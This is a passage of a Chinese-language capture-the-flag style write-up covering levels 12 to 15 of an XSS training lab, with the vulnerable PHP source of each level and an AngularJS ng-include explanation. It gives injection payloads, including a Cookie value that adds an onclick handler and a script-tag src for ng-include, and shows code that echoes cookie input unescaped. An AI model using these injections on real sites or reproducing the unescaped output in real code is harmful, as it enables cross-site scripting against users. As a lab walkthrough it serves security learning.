class&#x3D;&quot;variable&quot;&gt;$str33&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&quot; type&#x3D;&quot;hidden&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;&#x2F;form&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;&#x2F;center&gt;&#x27;&lt;&#x2F;span&gt;;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;center&gt;&lt;img src&#x3D;level12.png&gt;&lt;&#x2F;center&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;?php&lt;&#x2F;span&gt; &lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;keyword&quot;&gt;echo&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;string&quot;&gt;&quot;&lt;h3 align&#x3D;center&gt;payload的长度:&quot;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;strlen&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;variable&quot;&gt;$str&lt;&#x2F;span&gt;).&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&lt;&#x2F;h3&gt;&quot;&lt;&#x2F;span&gt;;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;&#x2F;body&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;&#x2F;html&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;table&gt;&lt;&#x2F;figure&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Level 13&lt;&#x2F;p&gt;
&lt;p&gt;原理与11题一样，注入点在Cookie，注意要触发cookie&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240204140248710.png&quot;&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240204140248710.png&quot; alt&#x3D;&quot;image-20240204140248710&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;答案：&lt;code&gt;Cookie: user&#x3D;&quot; onclick&#x3D;&quot;alert(1)&quot; type&#x3D;&quot;true&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;源代码：&lt;&#x2F;p&gt;
&lt;figure class&#x3D;&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class&#x3D;&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;1&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;2&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;3&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;4&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;5&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;6&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;7&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;8&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;9&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;10&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;11&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;12&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;13&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;14&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;15&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;16&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;17&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;18&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;19&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;20&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;21&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;22&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;23&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;24&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;25&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;26&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;27&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;28&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;29&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;30&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;31&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;32&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;33&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;34&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;35&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;36&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;37&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;td class&#x3D;&quot;code&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;head&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;meta http-equiv&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;&quot;content-type&quot;&lt;&#x2F;span&gt; content&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;&quot;text&#x2F;html;charset&#x3D;utf-8&quot;&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;script&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;window.alert &#x3D; &lt;span class&#x3D;&quot;function&quot;&gt;&lt;span class&#x3D;&quot;keyword&quot;&gt;function&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;params&quot;&gt;&lt;&#x2F;span&gt;)  &lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;function&quot;&gt;&lt;&#x2F;span&gt;&#123;     &lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;confirm&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;完成的不错！&quot;&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt; window.location.href&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;&quot;level14.php&quot;&lt;&#x2F;span&gt;; &lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&#125;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;&#x2F;script&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;title&gt;欢迎来到level13&lt;&#x2F;title&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;&#x2F;head&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;body&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;h1 align&#x3D;center&gt;欢迎来到level13&lt;&#x2F;h1&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;?php&lt;&#x2F;span&gt; &lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;setcookie&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;user&quot;&lt;&#x2F;span&gt;, &lt;span class&#x3D;&quot;string&quot;&gt;&quot;call me maybe?&quot;&lt;&#x2F;span&gt;, &lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;time&lt;&#x2F;span&gt;()+&lt;span class&#x3D;&quot;number&quot;&gt;3600&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;ini_set&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;display_errors&quot;&lt;&#x2F;span&gt;, &lt;span class&#x3D;&quot;number&quot;&gt;0&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str&lt;&#x2F;span&gt; &#x3D; &lt;span class&#x3D;&quot;variable&quot;&gt;$_GET&lt;&#x2F;span&gt;[&lt;span class&#x3D;&quot;string&quot;&gt;&quot;keyword&quot;&lt;&#x2F;span&gt;];&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str00&lt;&#x2F;span&gt; &#x3D; &lt;span class&#x3D;&quot;variable&quot;&gt;$_GET&lt;&#x2F;span&gt;[&lt;span class&#x3D;&quot;string&quot;&gt;&quot;t_sort&quot;&lt;&#x2F;span&gt;];&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str11&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;variable&quot;&gt;$_COOKIE&lt;&#x2F;span&gt;[&lt;span class&#x3D;&quot;string&quot;&gt;&quot;user&quot;&lt;&#x2F;span&gt;];&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str22&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;str_replace&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&gt;&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;variable&quot;&gt;$str11&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;variable&quot;&gt;$str33&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;str_replace&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&lt;&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&quot;&lt;&#x2F;span&gt;,&lt;span class&#x3D;&quot;variable&quot;&gt;$str22&lt;&#x2F;span&gt;);&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;keyword&quot;&gt;echo&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;string&quot;&gt;&quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;htmlspecialchars&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;variable&quot;&gt;$str&lt;&#x2F;span&gt;).&lt;span class&#x3D;&quot;string&quot;&gt;&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&lt;center&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;form id&#x3D;search&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;input name&#x3D;&quot;t_link&quot;  value&#x3D;&quot;&#x27;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&quot; type&#x3D;&quot;hidden&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;input name&#x3D;&quot;t_history&quot;  value&#x3D;&quot;&#x27;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&quot; type&#x3D;&quot;hidden&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;input name&#x3D;&quot;t_sort&quot;  value&#x3D;&quot;&#x27;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;htmlspecialchars&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;variable&quot;&gt;$str00&lt;&#x2F;span&gt;).&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&quot; type&#x3D;&quot;hidden&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;input name&#x3D;&quot;t_cook&quot;  value&#x3D;&quot;&#x27;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;variable&quot;&gt;$str33&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;&quot; type&#x3D;&quot;hidden&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;&#x2F;form&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;string&quot;&gt;&lt;&#x2F;center&gt;&#x27;&lt;&#x2F;span&gt;;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;center&gt;&lt;img src&#x3D;level13.png&gt;&lt;&#x2F;center&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;&lt;?php&lt;&#x2F;span&gt; &lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;keyword&quot;&gt;echo&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;string&quot;&gt;&quot;&lt;h3 align&#x3D;center&gt;payload的长度:&quot;&lt;&#x2F;span&gt;.&lt;span class&#x3D;&quot;title function_ invoke__&quot;&gt;strlen&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;variable&quot;&gt;$str&lt;&#x2F;span&gt;).&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&lt;&#x2F;h3&gt;&quot;&lt;&#x2F;span&gt;;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;meta&quot;&gt;?&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;&#x2F;body&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;&#x2F;html&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;table&gt;&lt;&#x2F;figure&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Level 14&lt;&#x2F;p&gt;
&lt;p&gt;本题环境出现问题，略（Windows服务器下无法复现）&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;Level 15&lt;&#x2F;p&gt;
&lt;p&gt;本题考查ng-include函数的使用&lt;&#x2F;p&gt;
&lt;p&gt;&lt;a href&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240204140554202.png&quot;&gt;&lt;img src&#x3D;&quot;https:&#x2F;&#x2F;c3ngh-blog.oss-cn-hangzhou.aliyuncs.com&#x2F;img&#x2F;image-20240204140554202.png&quot; alt&#x3D;&quot;image-20240204140554202&quot;&gt;&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;&lt;strong&gt;答案：&lt;code&gt;src&#x3D;&#39;level1.php?name&#x3D;&lt;script&gt;alert(1)&lt;&#x2F;script&gt;&#39;&lt;&#x2F;code&gt;&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;ng-include&lt;&#x2F;code&gt;是AngularJS框架中的一个指令（directive）。&lt;&#x2F;p&gt;
&lt;p&gt;&lt;code&gt;ng-include&lt;&#x2F;code&gt;用于在AngularJS应用中包含外部的HTML文件或其他AngularJS模板。&lt;strong&gt;引入AngularJS库：&lt;&#x2F;strong&gt; 确保在你的HTML文件中引入了AngularJS库。&lt;&#x2F;p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;pre&gt;&lt;code class&#x3D;&quot;language-html&quot;&gt;&lt;script src&#x3D;&quot;https:&#x2F;&#x2F;ajax.googleapis.com&#x2F;ajax&#x2F;libs&#x2F;angularjs&#x2F;1.8.0&#x2F;angular.min.js&quot;&gt;&lt;&#x2F;script&gt;
XML2. **创建AngularJS应用：** 在HTML文件中定义一个AngularJS应用。   &#96;&#96;&#96;html   &lt;div ng-app&#x3D;&quot;myApp&quot;&gt;       &lt;!-- 应用内容将在这里 --&gt;   &lt;&#x2F;div&gt;
&lt;figure class&#x3D;&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class&#x3D;&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;1&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;2&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;3&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;4&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;5&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;td class&#x3D;&quot;code&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;2. **使用&#96;ng-include&#96;指令：** 在需要包含外部内容的地方使用&#96;ng-include&#96;指令，并指定要包含的文件路径。&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;   &#96;&#96;&#96;html&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;   &lt;div ng-include&#x3D;&quot;&#x27;path&#x2F;to&#x2F;your&#x2F;template.html&#x27;&quot;&gt;&lt;&#x2F;div&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;table&gt;&lt;&#x2F;figure&gt;

注意：单引号内的路径可以是相对路径或绝对路径。

&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;定义AngularJS模块和控制器：&lt;&#x2F;strong&gt; 在JavaScript中定义AngularJS模块和控制器，并将其与应用相关联。&lt;&#x2F;p&gt;
&lt;figure class&#x3D;&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class&#x3D;&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;1&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;2&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;3&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;4&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;5&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;6&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;7&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;td class&#x3D;&quot;code&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;script&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;    &lt;span class&#x3D;&quot;keyword&quot;&gt;var&lt;&#x2F;span&gt; app &#x3D; angular.&lt;span class&#x3D;&quot;title function_&quot;&gt;module&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;myApp&#x27;&lt;&#x2F;span&gt;, []);&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;    app.&lt;span class&#x3D;&quot;title function_&quot;&gt;controller&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;string&quot;&gt;&#x27;myController&#x27;&lt;&#x2F;span&gt;, &lt;span class&#x3D;&quot;keyword&quot;&gt;function&lt;&#x2F;span&gt;(&lt;span class&#x3D;&quot;params&quot;&gt;$scope&lt;&#x2F;span&gt;) &#123;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;        &lt;span class&#x3D;&quot;comment&quot;&gt;&#x2F;&#x2F; 控制器逻辑&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;    &#125;);&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;language-javascript&quot;&gt;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;script&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;table&gt;&lt;&#x2F;figure&gt;
&lt;&#x2F;li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;关联控制器和&lt;code&gt;ng-include&lt;&#x2F;code&gt;：&lt;&#x2F;strong&gt; 在包含&lt;code&gt;ng-include&lt;&#x2F;code&gt;的元素中使用&lt;code&gt;ng-controller&lt;&#x2F;code&gt;来关联控制器。&lt;&#x2F;p&gt;
&lt;figure class&#x3D;&quot;highlight html&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class&#x3D;&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;1&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;2&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;3&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;td class&#x3D;&quot;code&quot;&gt;&lt;pre&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;div&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;attr&quot;&gt;ng-controller&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;&quot;myController&quot;&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;    &lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&lt;span class&#x3D;&quot;name&quot;&gt;div&lt;&#x2F;span&gt; &lt;span class&#x3D;&quot;attr&quot;&gt;ng-include&lt;&#x2F;span&gt;&#x3D;&lt;span class&#x3D;&quot;string&quot;&gt;&quot;&#x27;path&#x2F;to&#x2F;your&#x2F;template.html&#x27;&quot;&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;div&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;span class&#x3D;&quot;line&quot;&gt;&lt;span class&#x3D;&quot;tag&quot;&gt;&lt;&#x2F;&lt;span class&#x3D;&quot;name&quot;&gt;div&lt;&#x2F;span&gt;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;br&gt;&lt;&#x2F;pre&gt;&lt;&#x2F;td&gt;&lt;&#x2F;tr&gt;&lt;&#x2F;table&gt;&lt;&#x2F;figure&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ol&gt;
&lt;p&gt;这样，&lt;code&gt;ng-include&lt;&#x2F;code&gt;指令就会加载指定的HTML文件或AngularJS模板，并将其内容包含在应用中。这是一种实现模块化和代码重用的方式，特别适用于大型AngularJS应用。&lt;&#x2F;p&gt;
&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
